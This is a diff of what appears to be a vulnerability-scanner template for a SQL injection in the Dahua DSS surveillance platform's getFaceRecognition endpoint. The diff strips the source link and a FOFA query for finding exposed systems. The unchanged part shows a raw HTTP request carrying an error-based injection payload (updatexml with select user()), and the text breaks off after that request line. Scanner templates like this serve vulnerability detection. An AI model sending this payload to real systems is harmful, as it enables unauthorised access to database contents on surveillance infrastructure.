@@ -3,12 +3,8 @@ info:
   name: 大华城市安防监控系统平台管理 getFaceRecognition SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/lg3yfll3nnk1pgg3'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: lg3yfll3nnk1pgg3
-    fofa: app="dahua-DSS"
 http:
 - raw:
   - 'GET /portal/services/carQuery/getFaceRecognition/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml(1,concat(0x7e,(select%20user()),0x7e),1)--%22%7D/extend/1 HTTP/1.1
